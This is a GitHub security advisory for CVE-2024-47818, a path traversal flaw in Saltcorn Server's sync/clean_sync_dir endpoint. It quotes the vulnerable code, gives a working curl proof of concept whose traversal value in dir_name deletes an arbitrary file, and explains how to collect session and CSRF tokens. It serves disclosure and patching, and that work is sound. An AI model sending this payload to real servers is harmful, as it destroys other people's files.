# [H] Saltcorn Server allows logged-in users to delete arbitrary files because of a path traversal vulnerability

## Summary
Severity: High
Advisory: GHSA-43f3-h63w-p6f6
CVE: CVE-2024-47818
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-10-07
Source: https://github.com/advisories/GHSA-43f3-h63w-p6f6
Type: github-advisory

## Affected
- npm: `@saltcorn/server` — affected >=0 <1.0.0-beta.16

## Details
### Summary

A logged-in user with any role can delete arbitrary files on the filesystem by calling the `sync/clean_sync_dir` endpoint. The `dir_name` POST parameter is not validated/sanitized and is used to construct the `syncDir` that is deleted by calling `fs.rm`.

### Details

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346

```js
router.post(
  "/clean_sync_dir",
  error_catcher(async (req, res) => {
    const { dir_name } = req.body; // [1] source
    try {
      const rootFolder = await File.rootFolder();
      const syncDir = path.join(
        rootFolder.location,
        "mobile_app",
        "sync",
        dir_name // [2]
      );
      await fs.rm(syncDir, { recursive: true, force: true }); // [3] sink
      res.status(200).send("");
    } catch (error) {
      getState().log(2, `POST /sync/clean_sync_dir: '${error.message}'`);
      res.status(400).json({ error: error.message || error });
    }
  })
);
```


### PoC

The following PoC can be executed with a user with any role (`admin`, `staff`, `user`, `public`)

- create a file in a folder different from where the server is started:
```
touch /tmp/secret
cat /tmp/secret
```

- log with a user and retrieve valid `connect.sid` and `_csrf` values***
- send the following `curl` request
```
curl -i -X $'POST' \
  -H $'Host: localhost:3000' \
  -H $'Content-Type: application/x-www-form-urlencoded' \
  -H $'Content-Length: 93' \
  -H $'Origin: http://localhost:3000' \
  -H $'Connection: close' \
  -b $'connect.sid=VALID_CONNECT_SID_COOKIE; loggedin=true' \
  --data-binary $'_csrf=VALID_CSRF_VALUE&dir_name=/../../../../../../../../../../tmp/secret' \
  $'http://localhost:3000/sync/clean_sync_dir'
```

- check if the file previously created does not exist anymore:
```
cat /tmp/secret
cat: /tmp/secret: No such file or directory
```

*** obtain `connect.sid` and `_csrf` values

A possible way to retrieve `connect.sid` and `_csrf` values is to use the password reset functionality:
- log in
- open the browser developer console, go to the `Network` tab filter for `settings` request
- visit `http://localhost:3000/auth/settings`
- trigger the change password functionality
- under the `Headers` and `Request` tabs, grab the `connect.sid` and `_csrf` values and replace them in the curl command 

### Impact

Arbitrary file delete

### Recommended Mitigation

Resolve the `syncDir` and check if it starts with `rootFolder.location/mobile_app/sync`.

## References
- https://github.com/saltcorn/saltcorn/security/advisories/GHSA-43f3-h63w-p6f6
- https://nvd.nist.gov/vuln/detail/CVE-2024-47818
- https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a
- https://github.com/saltcorn/saltcorn
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346
